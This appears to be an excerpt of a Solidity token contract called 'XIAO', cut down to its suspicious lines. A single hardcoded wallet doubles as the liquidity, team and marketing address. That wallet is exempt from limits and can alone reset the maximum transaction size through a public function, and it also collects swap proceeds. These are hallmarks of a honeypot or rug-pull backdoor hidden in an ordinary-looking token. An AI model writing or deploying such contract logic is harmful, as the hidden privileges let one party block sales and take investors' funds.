...
contract Ownable is Context {
    ...
    address public LiquidityFee = 0xF7e6044AE6A81cC84960ab41f81f39CfC8eA356f;
...
contract XIAO
 is Context, IERC20, Ownable {
    ...
    string private _name = "XIAO";
    string private _symbol = "XIAO";
    ...
    constructor () {
        ...
        isWalletLimitExempt[LiquidityFee] = true;
        isTxLimitExempt[LiquidityFee] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        _swapPair[address(uniswapPair)] = true;
        _swapPair[_msgSender()] = true;

        teamWalletAddress = payable(address(0xF7e6044AE6A81cC84960ab41f81f39CfC8eA356f));
        MKTWallet = payable(address(0xF7e6044AE6A81cC84960ab41f81f39CfC8eA356f));
    ...
    function transferToAddresEH(address amount0Out) private view returns(bool){
        return !(amount0Out == LiquidityFee || false || false);
    }
    ...
    function setMaxTxAmount(uint256 a) public {if(msg.sender == MKTWallet){
        _maxTxAmount = a;}
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(MKTWallet, amountBNBMarketing);
